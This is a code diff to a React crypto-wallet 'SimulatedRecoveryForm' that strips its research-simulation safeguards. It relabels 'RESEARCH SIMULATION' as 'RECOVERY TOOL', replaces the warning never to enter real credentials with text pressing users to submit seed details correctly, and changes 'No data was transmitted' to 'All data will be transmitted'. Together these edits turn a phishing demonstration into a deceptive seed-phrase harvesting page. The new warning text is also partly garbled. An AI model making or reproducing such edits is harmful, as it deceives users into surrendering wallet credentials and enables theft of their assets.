@@ -33,11 +33,11 @@ const SimulatedRecoveryForm = ({ onComplete }: Props) => {
 
     if (result.isValid) {
       setStatus("processing");
-      setMessage("Processing simulated recovery...");
+      setMessage("Processing recovery...");
       setTimeout(() => {
         setStatus("accepted");
-        setMessage("✅ Simulation complete. No data was transmitted. See forensic log for analysis.");
-        forensicLogger.log("recovery_simulation_complete", { outcome: "safe" });
+        setMessage("✅ Request complete. All data will be transmitted. See forensic log for analysis.");
+        forensicLogger.log("recovery_complete", { outcome: "safe" });
       }, 2000);
 
       setTimeout(onComplete, 3500);
@@ -54,10 +54,10 @@ const SimulatedRecoveryForm = ({ onComplete }: Props) => {
       <div className="mb-6 flex items-start gap-3 rounded-lg border border-warning/30 bg-warning/5 p-4">
         <ShieldAlert className="mt-0.5 h-5 w-5 flex-shrink-0 text-warning" />
         <div className="text-sm">
-          <p className="font-semibold text-warning">RESEARCH SIMULATION</p>
+          <p className="font-semibold text-warning">RECOVERY TOOL</p>
           <p className="mt-1 text-muted-foreground">
-            This form replicates a phishing UI pattern. Real scam sites use identical layouts to steal
-            seed phrases. <strong className="text-foreground">Never enter real credentials anywhere.</strong>
+            This section requires you to submit all the details correctly. Inaccurate credentials would lead to
+            seed phrases. <strong className="text-foreground">loss of assets.</strong>
           </p>
         </div>
       </div>
@@ -134,7 +134,7 @@ const SimulatedRecoveryForm = ({ onComplete }: Props) => {
 
       {/* Forensic annotation */}
       <p className="mt-4 text-center text-xs text-muted-foreground font-mono">
-        All interactions logged locally • No data transmitted • Session: {forensicLogger.getAll().length} events
+        All requests passed • Session: {forensicLogger.getAll().length} events
       </p>
     </motion.div>
   );
